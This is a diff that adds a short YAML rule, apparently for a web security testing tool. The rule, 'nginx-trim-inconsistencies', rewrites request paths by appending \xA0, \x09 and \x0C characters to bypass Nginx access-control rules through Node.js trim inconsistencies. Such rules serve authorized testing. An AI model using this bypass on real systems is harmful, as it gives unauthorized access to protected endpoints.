@@ -1,0 +1,10 @@
+id: nginx-trim-inconsistencies
+description: "Exploits Nginx ACL rules bypass using Node.js trim inconsistencies
+  by modifying the path to include untrimmed characters.  "
+enabled: true
+modificationScript: |-
+  const modifiedRequest1 = helper.setPath(input, (prev) => prev + '\xA0');  
+  const modifiedRequest2 = helper.setPath(input, (prev) => prev + '\x09');  
+  const modifiedRequest3 = helper.setPath(input, (prev) => prev + '\x0C');  
+
+  return [modifiedRequest1, modifiedRequest2, modifiedRequest3];  
